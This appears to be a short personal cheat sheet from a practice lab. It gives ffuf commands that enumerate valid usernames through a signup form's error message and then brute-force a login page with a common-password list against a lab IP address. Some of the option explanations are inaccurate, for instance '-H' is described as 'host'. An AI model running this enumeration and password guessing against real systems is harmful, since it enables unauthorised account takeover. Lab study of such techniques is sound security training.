# Upgrades

    sudo apt update -y && sudo apt upgrade -y


# Enumeration (subdomains)(username)(atthentication bypass)
# ffuf

    ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.54.22/customers/signup -mr "username already exists" -fs {size}


-w wordlists path

-u url ex https://google.com

-H host

-fs switch, which tells ffuf to ignore any results that are of the specified size.

-d argument specifies the data that we are going to send

-mr argument is the text on the page we are looking for to validate we've found a valid username.

-X method of request {POST,GET ,DELETE}

-fc argument to check for an HTTP status code other than 200.

= FUZZ //worldlists content

    ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.54.22/customers/login -fc 200
